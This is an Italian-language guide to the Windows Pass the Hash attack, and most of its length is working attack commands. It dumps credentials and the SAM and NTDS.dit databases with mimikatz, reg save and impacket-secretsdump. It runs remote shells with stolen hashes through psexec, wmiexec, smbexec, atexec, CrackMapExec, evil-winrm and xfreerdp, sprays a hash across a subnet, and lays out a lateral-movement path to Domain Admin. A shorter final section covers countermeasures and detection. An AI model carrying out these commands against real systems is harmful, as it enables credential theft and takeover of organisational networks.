# Pass the Hash Attack

## Scopo

Questa guida spiega l'attacco Pass the Hash (PtH), una tecnica che consente di autenticarsi a servizi remoti utilizzando l'hash NTLM di una password invece della password in chiaro.

## Prerequisiti

- Hash NTLM della vittima (ottenuto via dump SAM, mimikatz, ecc.)
- Impacket, Mimikatz, CrackMapExec
- Target con autenticazione NTLM abilitata
- **Autorizzazione scritta** per i test

## Installazione

```bash
# Impacket
sudo apt-get install python3-impacket

# CrackMapExec
sudo apt-get install crackmapexec

# Mimikatz (su Windows)
# Download da github.com/gentilkiwi/mimikatz
```

---

## Come Funziona

### Autenticazione NTLM

```
1. Client richiede accesso
2. Server invia challenge (nonce)
3. Client calcola: Response = NTLM_Hash(password) + Challenge
4. Server verifica response usando hash memorizzato
```

**Punto chiave**: Il server verifica l'hash, non la password. Chi possiede l'hash può autenticarsi.

### Formato Hash NTLM

```
LM:NTLM
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Solo NTLM (LM disabilitato)
:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## Ottenere Hash

### Mimikatz (Locale)

```powershell
# Richiede privilegi SYSTEM/Administrator
mimikatz.exe

# Dump credenziali dalla memoria
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Output esempio
* Username : Administrator
* NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Secretsdump (Remoto)

```bash
# Con credenziali
impacket-secretsdump domain/user:password@target

# Con hash (PtH per ottenere più hash)
impacket-secretsdump -hashes :NTLM_HASH domain/admin@target

# Dump NTDS.dit (Domain Controller)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### Reg.exe (Windows)

```powershell
# Salva registry hives
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Estrai offline
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## Esecuzione Pass the Hash

### Impacket PsExec

```bash
# Esecuzione shell interattiva
impacket-psexec -hashes :NTLM_HASH domain/user@target

# Esempio
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CONTOSO/Administrator@192.168.1.10

# Con comando specifico
impacket-psexec -hashes :NTLM_HASH domain/user@target "cmd.exe /c whoami"
```

### Impacket WMIExec

```bash
# Più stealth di PsExec
impacket-wmiexec -hashes :NTLM_HASH domain/user@target

# Esegue comandi via WMI
impacket-wmiexec -hashes :NTLM_HASH domain/user@target "ipconfig /all"
```

### Impacket SMBExec

```bash
# Via SMB
impacket-smbexec -hashes :NTLM_HASH domain/user@target
```

### Impacket Atexec

```bash
# Via Task Scheduler
impacket-atexec -hashes :NTLM_HASH domain/user@target "whoami"
```

### CrackMapExec

```bash
# Test credenziali
crackmapexec smb target -u user -H NTLM_HASH

# Esecuzione comando
crackmapexec smb target -u user -H NTLM_HASH -x "whoami"

# PowerShell
crackmapexec smb target -u user -H NTLM_HASH -X "Get-Process"

# Dump SAM
crackmapexec smb target -u user -H NTLM_HASH --sam
```

### Mimikatz

```powershell
# Pass the Hash
sekurlsa::pth /user:Administrator /domain:CONTOSO /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

# Apre nuova shell con token impersonato
# Da lì, accesso a risorse remote
dir \\target\c$
```

### Evil-WinRM

```bash
# Shell PowerShell remota
evil-winrm -i target -u user -H NTLM_HASH

# Con upload/download
*Evil-WinRM* PS> upload payload.exe
*Evil-WinRM* PS> download secrets.txt
```

### xfreerdp (RDP con hash)

```bash
# RDP con PtH (richiede Restricted Admin mode)
xfreerdp /v:target /u:user /pth:NTLM_HASH
```

---

## Lateral Movement

### Processo Tipico

```
1. Comprometti primo host
2. Dump credenziali con Mimikatz
3. Identifica account privilegiati
4. PtH verso altri sistemi
5. Ripeti fino a Domain Admin
```

### Script Automatizzato

```bash
# Spray hash su range
crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH

# Output mostra dove l'hash è valido
SMB  192.168.1.10  445  DC01  [+] CONTOSO\Administrator (Pwn3d!)
SMB  192.168.1.20  445  SRV01 [+] CONTOSO\Administrator (Pwn3d!)
```

---

## Overpass the Hash / Pass the Key

Con Kerberos, puoi convertire hash NTLM in ticket:

```powershell
# Mimikatz - ottieni TGT
sekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe

# Nella nuova shell, genera ticket
klist  # Verifica ticket

# Ora puoi accedere a risorse Kerberos
dir \\dc.domain.com\c$
```

---

## Contromisure

### Credential Guard

```powershell
# Abilita Credential Guard (Win10/Server 2016+)
# Isola LSASS in hypervisor
# GPO: Computer Configuration > Administrative Templates > 
#      System > Device Guard > Turn On Virtualization Based Security
```

### Protected Users Group

```powershell
# Aggiungi utenti privilegiati
Add-ADGroupMember -Identity "Protected Users" -Members admin

# Effetti:
# - No NTLM authentication
# - No DES/RC4 in Kerberos pre-auth
# - No credential delegation
# - No offline sign-in
```

### Disabilita WDigest

```powershell
# Registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0
```

### LAPS (Local Admin Password Solution)

```powershell
# Password locali uniche per ogni computer
# Impedisce lateral movement con stessi hash
```

### Restricted Admin Mode

```powershell
# Disabilita (impedisce RDP PtH)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 1
```

### Monitoring

```
Event ID 4624: Successful logon (Type 3 = Network)
Event ID 4625: Failed logon
Event ID 4648: Explicit credentials logon
```

---

## Best Practices

- **Tiered administration**: Separa account admin per tier
- **Credential Guard**: Implementa su sistemi supportati
- **LAPS**: Password locali uniche
- **Protected Users**: Per account privilegiati
- **PAW**: Privileged Access Workstations
- **Monitoring**: Rileva PtH con SIEM
- **Least privilege**: Limita account privilegiati

## Riferimenti

- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [Microsoft - Pass the Hash](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material)
- [MITRE ATT&CK - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
